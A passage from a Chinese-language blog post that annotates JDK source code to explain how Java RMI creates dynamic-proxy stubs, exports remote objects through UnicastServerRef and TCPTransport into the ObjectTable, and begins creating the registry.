b) forceStubUse 为 false。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 如果满足上述条件，则此方法构造一个动态代理实例（该代理实现了 implClass 的远程接口），</span></span><br><span class="line"><span class="comment"> * 该代理通过 RemoteObjectInvocationHandler 实例构造，后者使用 clientRef。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 否则，此方法加载预生成的存根类（该存根类继承 RemoteStub 并实现 implClass 的远程接口），</span></span><br><span class="line"><span class="comment"> * 并使用 clientRef 构造该预生成存根类的实例。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> implClass 要获取远程接口的类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> clientRef 用于调用处理器的远程引用</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> forceStubUse 如果为 true，强制创建 RemoteStub</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException 如果 implClass 实现了非法的远程接口</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> StubNotFoundException 如果在查找/创建存根或创建动态代理实例时发生问题</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">createProxy</span><span class="params">(Class&lt;?&gt; implClass,</span></span><br><span class="line"><span class="params">                                 RemoteRef clientRef,</span></span><br><span class="line"><span class="params">                                 <span class="type">boolean</span> forceStubUse)</span></span><br><span class="line">        <span class="keyword">throws</span> StubNotFoundException &#123;</span><br><span class="line">    Class&lt;?&gt; remoteClass;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取远程接口的类</span></span><br><span class="line">        remoteClass = getRemoteClass(implClass);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex ) &#123;</span><br><span class="line">        <span class="comment">// 如果找不到远程接口，抛出 StubNotFoundException 异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">            <span class="string">&quot;object does not implement a remote interface: &quot;</span> +</span><br><span class="line">            implClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 forceStubUse 为 true，或者未满足忽略存根类条件（即存在存根类），则创建 RemoteStub</span></span><br><span class="line">    <span class="keyword">if</span> (forceStubUse || !(ignoreStubClasses || !stubClassExists(remoteClass))) &#123;</span><br><span class="line">        <span class="keyword">return</span> createStub(remoteClass, clientRef);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取类加载器和实现类的远程接口</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> implClass.getClassLoader();</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt;[] interfaces = getRemoteInterfaces(implClass);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建用于远程调用的 InvocationHandler</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(clientRef);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过 PrivilegedAction 创建动态代理</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Remote&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Remote <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> (Remote) Proxy.newProxyInstance(loader,</span><br><span class="line">                                                       interfaces,</span><br><span class="line">                                                       handler);</span><br><span class="line">            &#125;&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// 如果创建代理失败，抛出 StubNotFoundException 异常</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(<span class="string">&quot;unable to create proxy&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>InvocationHandler</code> 是 <code>RemoteObjectInvocationHandler</code> 对象，并且参数传入前面 <code>getClientRef</code> 创建的 <code>UnicastRef</code> 对象并保存到 <code>RemoteRef</code> 成员。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;RemoteObject&lt;/code&gt; 类实现了远程对象的 &lt;code&gt;java.lang.Object&lt;/code&gt; 行为。</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;RemoteObject&lt;/code&gt; 提供了远程语义，通过实现 hashCode、equals 和 toString 方法来支持对象的远程行为。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Ann Wollrath</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Laird Dornin</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Peter Jones</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>       JDK1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">RemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Remote</span>, java.io.Serializable &#123;</span><br><span class="line">    <span class="comment">// 远程对象的引用</span></span><br><span class="line">    <span class="keyword">protected</span> RemoteRef ref;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建一个远程对象，并用指定的远程引用初始化。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> newref 远程引用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObject</span><span class="params">(RemoteRef newref)</span> &#123;</span><br><span class="line">        ref = newref;  <span class="comment">// 将传入的远程引用赋给 ref 字段</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;InvocationHandler&lt;/code&gt; 接口的实现类，用于 Java 远程方法调用（Java RMI）。</span></span><br><span class="line"><span class="comment"> * 该调用处理器可与动态代理实例一起使用，作为预生成存根类的替代。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;应用程序通常不需要直接使用此类。导出以使用动态代理的远程对象（通过 &#123;<span class="doctag">@link</span> UnicastRemoteObject&#125;</span></span><br><span class="line"><span class="comment"> * 或 &#123;<span class="doctag">@link</span> Activatable&#125;）会在该代理的调用处理器中持有该类的实例。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>  Ann Wollrath</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>   1.5</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectInvocationHandler</span></span><br><span class="line">    <span class="keyword">extends</span> <span class="title class_">RemoteObject</span></span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建一个新的 &lt;code&gt;RemoteObjectInvocationHandler&lt;/code&gt; 实例，并用指定的 &lt;code&gt;RemoteRef&lt;/code&gt; 初始化。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ref 远程引用</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> NullPointerException 如果 &lt;code&gt;ref&lt;/code&gt; 为 &lt;code&gt;null&lt;/code&gt;，抛出空指针异常</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RemoteObjectInvocationHandler</span><span class="params">(RemoteRef ref)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(ref);  <span class="comment">// 调用父类构造方法初始化远程引用</span></span><br><span class="line">        <span class="keyword">if</span> (ref == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();  <span class="comment">// 如果远程引用为空，抛出异常</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>创建完动态代理后 <code>UnicastServerRef#exportObject</code> 函数又有如下过程：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果存根是 RemoteStub 的实例，设置骨架（Skeleton）</span></span><br><span class="line"><span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">    setSkeleton(impl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 target 对象，target 包含实现类、当前对象（调度器）、存根和远程引用等信息</span></span><br><span class="line"><span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span> </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Target</span>(impl, <span class="built_in">this</span>, stub, ref.getObjID(), permanent);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过引用 UnicastServerRef#exportObject 导出目标对象</span></span><br><span class="line">ref.exportObject(target);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将远程对象的方法更新到 hashToMethod_Map 中</span></span><br><span class="line">hashToMethod_Map = hashToMethod_Maps.get(implClass);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回存根</span></span><br><span class="line"><span class="keyword">return</span> stub;</span><br></pre></td></tr></table></figure></div>

<ol>
<li>由于创建的存根是远程对象的代理类而不是 <code>RemoteStub</code> 的示例，因此不调用 <code>setSkeleton</code> 函数。</li>
<li>创建了一个 <code>sun.rmi.transport.Target</code> 对象用来保存远程对象的信息。</li>
<li>通过 <code>UnicastServerRef#exportObject</code> 方法将 <code>target</code> 对象导出。</li>
<li>更新 <code>hashToMethod_Map</code>。这里 <code>hashToMethod_Map</code> 存储的是<strong>方法哈希</strong>和<strong>方法</strong>的对应关系，后面远程调用是根据方法哈希找到方法的。</li>
<li>返回存根，即远程对象的动态代理。</li>
</ol>
<p>其中 <code>sun.rmi.transport.Target</code> 的构造函数如下，这里要注意初始化的成员变量及其含义，后面会用到。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为远程对象 &quot;impl&quot; 构造一个具有特定对象 ID 的 Target 对象。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Target</span><span class="params">(Remote impl, Dispatcher disp, Remote stub, ObjID id,</span></span><br><span class="line"><span class="params">              <span class="type">boolean</span> permanent)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置分发器</span></span><br><span class="line">    <span class="built_in">this</span>.disp = disp;</span><br><span class="line">    <span class="comment">// 存储远程对象的存根</span></span><br><span class="line">    <span class="built_in">this</span>.stub = stub;</span><br><span class="line">    <span class="comment">// 设置对象的唯一标识 ID</span></span><br><span class="line">    <span class="built_in">this</span>.id = id;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另外 <code>UnicastServerRef#exportObject</code> 有如下调用链：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UnicastServerRef#exportObject</span><br><span class="line">    TCPEndpoint#exportObject</span><br><span class="line">        TCPTransport#exportObject</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>TCPTransport#exportObject</code> 函数代码逻辑如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 导出对象，使其能够接收来自客户端的调用。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 确保服务器套接字正在监听，并在同步块内计数此导出，</span></span><br><span class="line"><span class="comment">     * 以防止由于并发取消导出导致服务器套接字被关闭。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        listen();  <span class="comment">// 确保服务器套接字开始监听请求</span></span><br><span class="line">        exportCount++;  <span class="comment">// 增加导出计数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 尝试将 Target 添加到导出对象表中；</span></span><br><span class="line"><span class="comment">     * 如果成功，继续计数该导出（保持服务器套接字处于打开状态）。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.exportObject(target);  <span class="comment">// 调用父类方法导出对象</span></span><br><span class="line">        ok = <span class="literal">true</span>;  <span class="comment">// 如果成功，标记为成功</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">            <span class="comment">// 如果导出失败，减少导出计数</span></span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">                decrementExportCount();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>该函数首先调用 <code>listen()</code> 函数为 <code>stub</code> 开启随机端口，之后调用 <code>Transport#exportObject</code>将 <code>target</code> 注册到 <code>ObjectTable</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将目标对象添加到对象表中。如果它不是永久条目，</span></span><br><span class="line"><span class="comment"> * 则确保回收线程正在运行，以便移除被回收的条目并保持虚拟机存活。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">putTarget</span><span class="params">(Target target)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">    <span class="type">ObjectEndpoint</span> <span class="variable">oe</span> <span class="operator">=</span> target.getObjectEndpoint();  <span class="comment">// 获取目标对象的对象端点</span></span><br><span class="line">    <span class="type">WeakRef</span> <span class="variable">weakImpl</span> <span class="operator">=</span> target.getWeakImpl();  <span class="comment">// 获取目标对象的弱引用实现</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (DGCImpl.dgcLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        DGCImpl.dgcLog.log(Log.VERBOSE, <span class="string">&quot;add object &quot;</span> + oe);  <span class="comment">// 如果日志级别允许，记录添加的对象信息</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (tableLock) &#123;  <span class="comment">// 锁定对象表，确保线程安全</span></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 如果实现已经被回收，则不做任何操作（参见 6597112）。在持有 tableLock 时检查，</span></span><br><span class="line"><span class="comment">         * 确保回收线程不能在 null 检查和 put/increment 操作之间处理 weakImpl。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (target.getImpl() != <span class="literal">null</span>) &#123;  <span class="comment">// 如果目标对象的实现不为 null</span></span><br><span class="line">            <span class="comment">// 如果对象端点已经存在于对象表中，抛出导出异常</span></span><br><span class="line">            <span class="keyword">if</span> (objTable.containsKey(oe)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(</span><br><span class="line">                    <span class="string">&quot;internal error: ObjID already in use&quot;</span>);</span><br><span class="line">            <span class="comment">// 如果目标对象的弱引用实现已经存在于实现表中，抛出导出异常</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (implTable.containsKey(weakImpl)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;object already exported&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将目标对象添加到对象表和实现表中</span></span><br><span class="line">            objTable.put(oe, target);</span><br><span class="line">            implTable.put(weakImpl, target);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果目标对象不是永久的，增加保持活跃计数</span></span><br><span class="line">            <span class="keyword">if</span> (!target.isPermanent()) &#123;</span><br><span class="line">                incrementKeepAliveCount();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Export the object so that it can accept incoming calls.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    target.setExportedTransport(<span class="built_in">this</span>); <span class="comment">// 设置 target.exportedTransport 为当前 TCPTransport 对象</span></span><br><span class="line">    ObjectTable.putTarget(target); <span class="comment">// 将 target 注册到 ObjectTable 中</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>从最 <code>putTarget</code> 的实现可以看出，<code>target</code> 是被放入 <code>objTable</code> 和 <code>implTable</code> 中。从键 <code>oe</code>、<code>weakImpl</code> 可以看出，<code>ObjectTable</code> 提供 <code>ObjectEndpoint</code> 和 <code>Remote</code> 实例两种方式来查找 <code>Target</code>。</p>
<p>远程对象创建过程可以总结为下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/08/25/Java%20RMI%20&%20JNDI/images/exportObject.png"
                      alt="img"
                ></p>
<ul>
<li>远程对象继承 <code>UnicastRemoteObject</code>，<code>exportObject</code> 用于将这个对象导出，每个远程对象都有对应的远程引用（<code>UnicastServerRef</code>）。</li>
<li>对象导出是指，创建远程对象的动态代理，并将对象的方法和方法哈希存储到远程引用的 <code>hashToMethod_Map</code> 里，后面客户端通过传递方法哈希来找到对应的方法。同时开启一个 <code>socket</code> 监听到来的请求。远程对象、动态代理和对象 <code>id</code> 被封装为 <code>Target</code>，<code>target</code> 会被存储到 <code>TCPTransport</code> 的 <code>objTables</code> 里，后面客户端通过传递对象 <code>id</code> 可获取到对应 <code>target</code>。</li>
<li>动态代理 <code>Stub</code> 中含有这个远程对象的联系方式（<code>LiveRef</code>，包括主机、端口、对象<code>id</code>）。</li>
</ul>
<h4 id="注册中心创建"><a href="#注册中心创建" class="headerlink" title="注册中心创建"></a>注册中心创建</h4><p>在代码中，我们通常使用 <code>java.rmi.registry.LocateRegistry#createRegistry</code> 来创建注册中心：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br></pre></td></tr></table></figure></div>

<p><code>createRegistry</code> 方法实际创建了一个 <code>RegistryImpl</code> 对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在本地主机上创建并导出一个 &lt;code&gt;Registry&lt;/code&gt; 实例，该实例</span></span><br><span class="line"><span class="comment"> * 在指定的 &lt;code&gt;port&lt;/code&gt; 上接受请求。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;该 &lt;code&gt;Registry&lt;/code&gt; 实例的导出方式类似于静态的</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> UnicastRemoteObject#exportObject(Remote,int)</span></span><br><span class="line"><span class="comment"> * UnicastRemoteObject.exportObject&#125; 方法的调用，传入</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;Registry&lt;/code&gt; 实例和指定的 &lt;code&gt;port&lt;/code&gt; 作为参数，</span></span><br><span class="line"><span class="comment"> * 不同之处在于，&lt;code&gt;Registry&lt;/code&gt; 实例会使用一个</span></span><br><span class="line"><span class="comment"> * 预定义的对象标识符（ObjID），即使用 &#123;<span class="doctag">@link</span> ObjID#REGISTRY_ID&#125;</span></span><br><span class="line"><span class="comment"> * 的值构造的 &#123;<span class="doctag">@link</span> ObjID&#125; 实例。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> port 注册中心接受请求的端口号</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回创建的注册中心实例</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@exception</span> RemoteException 如果注册中心无法导出，则抛出该异常</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> JDK1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">createRegistry</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryImpl</span>(port);  <span class="comment">// 创建并返回一个 RegistryImpl 实例</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>RegistryImpl</code> 的构造方法首先创建 <code>LiveRef</code> 对象，然后创建 <code>UnicastServerRef</code> 对象，最后调用 <code>setup</code> 进行配置。这里 <code>LiveRef</code> 传入的 <code>id</code> 为 0。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 注册中心的预定义 &lt;code&gt;ObjID&lt;/code&gt; 对象编号。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">REGISTRY_ID</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.REGISTRY_ID);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在指定端口上构造一个新的 RegistryImpl 实例。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">RegistryImpl</span><span class="params">(<span class="type">int</span> port)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 如果端口是默认的注册中心端口并且存在安全管理器</span></span><br><span class="line">    <span class="keyword">if</span> (port == Registry.REGISTRY_PORT &amp;&amp; System.getSecurityManager() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 仅对默认端口授予权限</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用 PrivilegedAction 授予权限</span></span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">                    <span class="comment">// 创建 LiveRef 和 UnicastServerRef 实例</span></span><br><span class="line">                    <span class="type">LiveRef</span> 